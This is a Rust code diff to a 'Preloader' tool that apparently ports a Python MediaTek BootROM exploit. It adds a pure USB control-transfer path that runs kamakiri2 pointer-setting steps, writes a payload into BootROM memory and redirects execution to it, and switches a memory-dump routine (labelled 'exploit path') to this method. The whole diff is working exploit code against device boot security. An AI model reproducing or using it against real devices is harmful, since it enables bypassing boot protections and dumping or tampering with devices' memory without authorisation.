@@ -236,19 +236,23 @@ impl Preloader {
     }
 
     fn inject_payload(&mut self, payload: &[u8], expected_ack: u32) -> Result<(), String> {
-        self.inject_payload_with_options(payload, expected_ack, false)
+        self.inject_payload_with_options(payload, expected_ack, false, false)
     }
 
     fn inject_payload_skip_ptr_read(&mut self, payload: &[u8], expected_ack: u32) -> Result<(), String> {
-        self.inject_payload_with_options(payload, expected_ack, true)
+        self.inject_payload_with_options(payload, expected_ack, true, false)
     }
 
-    fn inject_payload_with_options(&mut self, payload: &[u8], expected_ack: u32, skip_ptr_read: bool) -> Result<(), String> {
+    fn inject_payload_skip_all_da(&mut self, payload: &[u8], expected_ack: u32) -> Result<(), String> {
+        self.inject_payload_with_options(payload, expected_ack, true, true)
+    }
+
+    fn inject_payload_with_options(&mut self, payload: &[u8], expected_ack: u32, skip_ptr_read: bool, skip_da_write: bool) -> Result<(), String> {
         let chip = self.chip.ok_or_else(|| "未识别的处理器型号".to_string())?;
         let ptr_da_bra = self.ptr_da_bra();
         let ptr_da = chip.brom_register_access.1; // 对齐 Python: brom_register_access[0][1]
 
-        debug!("[inject] payload_size={}, skip_ptr_read={}", payload.len(), skip_ptr_read);
+        debug!("[inject] payload_size={}, skip_ptr_read={}, skip_da_write={}", payload.len(), skip_ptr_read, skip_da_write);
         debug!(
             "[inject] ptr_da_bra=0x{:08X} ptr_da=0x{:08X}",
             ptr_da_bra, ptr_da
@@ -269,39 +273,75 @@ impl Preloader {
         let lc = linecode;
         debug!("[inject] linecode={:02X?}", lc);
 
-        let ptr_send = if skip_ptr_read {
-            // dump payload 场景：直接使用 ptr_send_addr，不调用 da_read
+        if skip_da_write {
+            // dump payload 场景：完全跳过 da_read 和 da_write
+            // 只执行 kamakiri2 steps 设置指针，然后通过 ctrl_transfer 直接发送 payload
+            info!("[inject] skip_da_write=true → 使用纯 ctrl_transfer 路径");
+
             let ptr_send = self.ptr_send_addr();
-            debug!("[inject] skip_ptr_read=true, using ptr_send=0x{:08X}", ptr_send);
-            ptr_send
-        } else {
-            // 正常场景：通过 da_read 读取 ptr_send
-            let ptr_send = self.read_payload_address(&lc, ptr_da_bra, ptr_da, chip.watchdog)?;
             debug!("[inject] ptr_send=0x{:08X}", ptr_send);
-            ptr_send
-        };
 
-        debug!("[inject] da_write #1: payload to brom_payload_addr");
-        self.da_write(
-            &lc,
-            ptr_da_bra,
-            ptr_da,
-            chip.watchdog,
-            chip.brom_payload_addr,
-            payload,
-            true,
-        )?;
+            // 执行 kamakiri2 steps 设置指针（对齐 Python kamakiri2 步骤）
+            debug!("[inject] 执行 kamakiri2 steps 设置指针...");
+            self.kamakiri2_step(&lc, ptr_da_bra, ptr_da_bra.wrapping_add(5))?;
+            self.kamakiri2_step(&lc, ptr_da_bra, ptr_da_bra.wrapping_add(6))?;
+            self.kamakiri2_step(&lc, ptr_da_bra, ptr_da_bra.wrapping_add(7))?;
 
-        debug!("[inject] da_write #2: payload_addr to ptr_send");
-        self.da_write(
-            &lc,
-            ptr_da_bra,
-            ptr_da,
-            chip.watchdog,
-            ptr_send,
-            &chip.brom_payload_addr.to_le_bytes(),
-            false,
-        )?;
+            // 通过 ctrl_transfer 直接发送 payload（对齐 Python send_payload）
+            debug!("[inject] 通过 ctrl_transfer 发送 payload ({} 字节)...", payload.len());
+            let mut d = lc.to_vec();
+            d.extend(&chip.brom_payload_addr.to_le_bytes());
+            let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d)?;
+
+            // 发送 payload 数据
+            let chunk_size = 0x40;
+            for chunk in payload.chunks(chunk_size) {
+                let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, chunk)?;
+            }
+
+            // 设置 ptr_send 指向 payload 地址
+            let mut d2 = lc.to_vec();
+            d2.extend(&ptr_send.to_le_bytes());
+            let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d2)?;
+
+            let mut d3 = lc.to_vec();
+            d3.extend(&chip.brom_payload_addr.to_le_bytes());
+            let _ = self.device.ctrl_transfer_out(0x21, 0x20, 0, 0, &d3)?;
+        } else {
+            let ptr_send = if skip_ptr_read {
+                // dump payload 场景：直接使用 ptr_send_addr，不调用 da_read
+                let ptr_send = self.ptr_send_addr();
+                debug!("[inject] skip_ptr_read=true, using ptr_send=0x{:08X}", ptr_send);
+                ptr_send
+            } else {
+                // 正常场景：通过 da_read 读取 ptr_send
+                let ptr_send = self.read_payload_address(&lc, ptr_da_bra, ptr_da, chip.watchdog)?;
+                debug!("[inject] ptr_send=0x{:08X}", ptr_send);
+                ptr_send
+            };
+
+            debug!("[inject] da_write #1: payload to brom_payload_addr");
+            self.da_write(
+                &lc,
+                ptr_da_bra,
+                ptr_da,
+                chip.watchdog,
+                chip.brom_payload_addr,
+                payload,
+                true,
+            )?;
+
+            debug!("[inject] da_write #2: payload_addr to ptr_send");
+            self.da_write(
+                &lc,
+                ptr_da_bra,
+                ptr_da,
+                chip.watchdog,
+                ptr_send,
+                &chip.brom_payload_addr.to_le_bytes(),
+                false,
+            )?;
+        }
 
         std::thread::sleep(Duration::from_millis(200));
 
@@ -606,9 +646,9 @@ impl Preloader {
             payload.push(0);
         }
 
-        // exploit 路径：跳过 da_read，直接使用 ptr_send_addr 注入
-        debug!("[dump] inject_payload_skip_ptr_read: size={}", payload.len());
-        self.inject_payload_skip_ptr_read(&payload, 0xC1C2C3C4)?;
+        // exploit 路径：完全跳过 da_read 和 da_write，使用纯 ctrl_transfer 路径
+        debug!("[dump] inject_payload_skip_all_da: size={}", payload.len());
+        self.inject_payload_skip_all_da(&payload, 0xC1C2C3C4)?;
 
         // === 关键：跳过 read_payload_address 和 da_read，直接清理后读数据 ===
         info!("[dump] payload 注入成功 → 跳过 da_read，直接清理并读数据");
